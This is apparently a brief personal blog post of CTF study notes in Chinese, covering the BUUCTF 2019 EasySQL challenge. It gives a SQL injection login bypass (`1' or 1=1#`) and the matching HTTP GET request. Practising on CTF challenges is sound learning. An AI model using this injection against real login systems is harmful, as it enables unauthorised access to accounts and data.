---
layout: default
title: CTF Learning Challenges Notes
categories:
- Security
tags:
- Security
---
//Description: CTF学习刷题笔记。记录刷题过程中遇到的问题。

//Create Date: 2025-08-13 09:04:20

//Author: channy

[toc]

# 刷 [BUUCTF](https://buuoj.cn/challenges)

## Basic
### [2019 EasySQL](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]EasySQL)
SQL漏洞，`1' or 1=1#`登录成功
```
GET /check.php?username=1%27+or+1%3D1%23&password=1 HTTP/1.1
```
